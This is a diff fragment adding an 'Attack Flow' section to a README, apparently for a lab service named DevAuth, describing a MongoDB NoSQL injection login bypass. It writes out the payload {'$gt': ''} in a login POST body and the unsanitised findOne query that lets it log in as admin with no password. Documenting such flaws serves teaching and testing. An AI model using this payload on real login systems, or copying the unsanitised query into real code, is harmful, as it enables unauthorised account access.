@@ -426,6 +426,20 @@ db.users.findOne({ username: "admin", password: { $gt: "" } })
 
 ## README.md
 
+### Attack Flow
+
+```
+Attacker sends: POST /api/login
+  { "username": "admin", "password": { "$gt": "" } }
+        ↓
+DevAuth (3022) passes body directly to MongoDB:
+  db.users.findOne({ username: "admin", password: { $gt: "" } })
+        ↓
+MongoDB evaluates: "is password > empty string?" → TRUE for every user
+        ↓
+Login succeeds. No password required.
+```
+
 ### Port Reference
 
 | Port | Role | File |
